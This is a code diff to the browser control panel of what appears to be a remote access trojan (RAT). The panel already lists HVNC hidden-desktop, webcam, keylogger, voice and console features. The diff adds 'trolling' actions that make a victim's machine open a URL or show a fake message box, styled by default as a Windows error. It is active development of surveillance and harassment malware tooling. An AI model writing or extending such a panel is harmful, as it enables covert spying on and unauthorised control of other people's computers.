@@ -19,7 +19,6 @@ const PANEL_GROUPS = [
     items: [
       { label: "Console",          icon: "fa-solid fa-terminal",   color: "#34d399", open: "console" },
       { label: "Backstage (HVNC)", icon: "fa-solid fa-ghost",      color: "#a78bfa", open: "Backstage" },
-      { label: "Voice",            icon: "fa-solid fa-headset",    color: "#2dd4bf", open: "voice" },
     ],
   },
   {
@@ -31,6 +30,7 @@ const PANEL_GROUPS = [
       { label: "Webcam",           icon: "fa-solid fa-video",      color: "#34d399", open: "webcam" },
       { label: "Keylogger",        icon: "fa-solid fa-keyboard",   color: "#facc15", open: "keylogger" },
       { label: "Process Manager",  icon: "fa-solid fa-list-check", color: "#fb923c", open: "processes" },
+      { label: "Voice",            icon: "fa-solid fa-headset",    color: "#2dd4bf", open: "voice" },
     ],
   },
   {
@@ -49,6 +49,8 @@ const PANEL_GROUPS = [
     color: "#f472b6",
     items: [
       { label: "Change Wallpaper", icon: "fa-solid fa-image", color: "#f472b6", action: "wallpaper" },
+      { label: "Open URL", icon: "fa-solid fa-link", color: "#f472b6", action: "open-url" },
+      { label: "Message Box", icon: "fa-solid fa-comment-dots", color: "#f472b6", action: "message-box" },
     ],
   },
   {
@@ -131,8 +133,11 @@ async function sendCommand(clientId, action, payload) {
     credentials: "include",
     body: JSON.stringify(body),
   });
-  if (!res.ok) throw new Error(`Command failed: ${res.status}`);
-  return res.json().catch(() => ({}));
+  const data = await res.json().catch(() => ({}));
+  if (!res.ok) {
+    throw new Error(data.error || data.message || `Command failed: ${res.status}`);
+  }
+  return data;
 }
 
 async function patchClient(clientId, field, value) {
@@ -400,6 +405,148 @@ function uploadWallpaper(clientId, file) {
 }
 
 /* ──────────────────────────────────────────────────────────── */
+/*  Trolling modals                                            */
+/* ──────────────────────────────────────────────────────────── */
+
+function closeSpModal(overlay) {
+  if (overlay && overlay.parentNode) overlay.remove();
+}
+
+function createSpModal({ title, bodyHtml, confirmLabel = "Send" }) {
+  return new Promise((resolve) => {
+    const overlay = document.createElement("div");
+    overlay.className = "sp-modal-overlay";
+    overlay.innerHTML = `
+      <div class="sp-modal" role="dialog" aria-modal="true">
+        <div class="sp-modal-header">
+          <span class="sp-modal-title"></span>
+          <button type="button" class="sp-modal-close" aria-label="Close">&times;</button>
+        </div>
+        <div class="sp-modal-body"></div>
+        <div class="sp-modal-footer">
+          <button type="button" class="sp-modal-btn sp-modal-btn-cancel">Cancel</button>
+          <button type="button" class="sp-modal-btn sp-modal-btn-confirm"></button>
+        </div>
+      </div>
+    `;
+    overlay.querySelector(".sp-modal-title").textContent = title;
+    overlay.querySelector(".sp-modal-body").innerHTML = bodyHtml;
+    overlay.querySelector(".sp-modal-btn-confirm").textContent = confirmLabel;
+
+    const finish = (value) => {
+      closeSpModal(overlay);
+      resolve(value);
+    };
+
+    overlay.querySelector(".sp-modal-close").addEventListener("click", () => finish(null));
+    overlay.querySelector(".sp-modal-btn-cancel").addEventListener("click", () => finish(null));
+    overlay.addEventListener("click", (e) => {
+      if (e.target === overlay) finish(null);
+    });
+    overlay.querySelector(".sp-modal-btn-confirm").addEventListener("click", () => {
+      const form = overlay.querySelector(".sp-modal-body");
+      finish(form);
+    });
+    overlay.addEventListener("keydown", (e) => {
+      if (e.key === "Escape") finish(null);
+    });
+
+    document.body.appendChild(overlay);
+    const firstInput = overlay.querySelector("input, textarea, select, button");
+    if (firstInput) firstInput.focus();
+  });
+}
+
+function normalizeClientUrl(raw) {
+  const value = String(raw || "").trim();
+  if (!value) return { ok: false, error: "URL is required" };
+  let candidate = value;
+  if (!/^[a-zA-Z][a-zA-Z0-9+.-]*:/.test(candidate)) {
+    candidate = `https://${candidate}`;
+  }
+  try {
+    const parsed = new URL(candidate);
+    const scheme = parsed.protocol.replace(/:$/, "").toLowerCase();
+    if (scheme !== "http" && scheme !== "https") {
+      return { ok: false, error: "Only http and https URLs are allowed" };
+    }
+    if (!parsed.hostname) return { ok: false, error: "Invalid URL" };
+    return { ok: true, url: parsed.toString() };
+  } catch {
+    return { ok: false, error: "Invalid URL" };
+  }
+}
+
+async function openOpenUrlModal(clientId) {
+  const body = await createSpModal({
+    title: "Open URL",
+    confirmLabel: "Open",
+    bodyHtml: `
+      <label class="sp-field">
+        <span>URL</span>
+        <input type="url" class="sp-input" data-sp-url placeholder="https://example.com" autocomplete="off" />
+      </label>
+      <p class="sp-hint">Opens in the client's default browser (http/https only).</p>
+    `,
+  });
+  if (!body) return;
+
+  const raw = body.querySelector("[data-sp-url]")?.value || "";
+  const normalized = normalizeClientUrl(raw);
+  if (!normalized.ok) {
+    showToast(normalized.error, "error");
+    return;
+  }
+
+  try {
+    await sendCommand(clientId, "open_url", { url: normalized.url });
+    showToast(`Opened ${normalized.url}`, "success");
+  } catch (err) {
+    showToast(err.message || "Open URL failed", "error");
+  }
+}
+
+async function openMessageBoxModal(clientId) {
+  const body = await createSpModal({
+    title: "Message Box",
+    confirmLabel: "Show",
+    bodyHtml: `
+      <label class="sp-field">
+        <span>Title</span>
+        <input type="text" class="sp-input" data-sp-title value="Windows" maxlength="256" />
+      </label>
+      <label class="sp-field">
+        <span>Message</span>
+        <textarea class="sp-input sp-textarea" data-sp-text rows="3" maxlength="2048" placeholder="Something went wrong..."></textarea>
+      </label>
+      <fieldset class="sp-field sp-icon-field">
+        <legend>Icon</legend>
+        <label class="sp-radio"><input type="radio" name="sp-msg-icon" value="error" /> Error</label>
+        <label class="sp-radio"><input type="radio" name="sp-msg-icon" value="warning" /> Warning</label>
+        <label class="sp-radio"><input type="radio" name="sp-msg-icon" value="info" checked /> Info</label>
+        <label class="sp-radio"><input type="radio" name="sp-msg-icon" value="question" /> Question</label>
+      </fieldset>
+    `,
+  });
+  if (!body) return;
+
+  const title = (body.querySelector("[data-sp-title]")?.value || "").trim() || "Windows";
+  const text = (body.querySelector("[data-sp-text]")?.value || "").trim();
+  const icon = body.querySelector('input[name="sp-msg-icon"]:checked')?.value || "info";
+  if (!text) {
+    showToast("Message text is required", "error");
+    return;
+  }
+
+  try {
+    await sendCommand(clientId, "message_box", { title, text, icon });
+    showToast("Message box sent", "success");
+  } catch (err) {
+    showToast(err.message || "Message box failed", "error");
+  }
+}
+
+/* ──────────────────────────────────────────────────────────── */
 /*  Action handler                                             */
 /* ──────────────────────────────────────────────────────────── */
 
@@ -448,6 +595,14 @@ async function handleAction(clientId, action) {
 
       case "wallpaper":
         triggerWallpaperUpload(clientId);
+        break;
+
+      case "open-url":
+        openOpenUrlModal(clientId);
+        break;
+
+      case "message-box":
+        openMessageBoxModal(clientId);
         break;
 
       default:
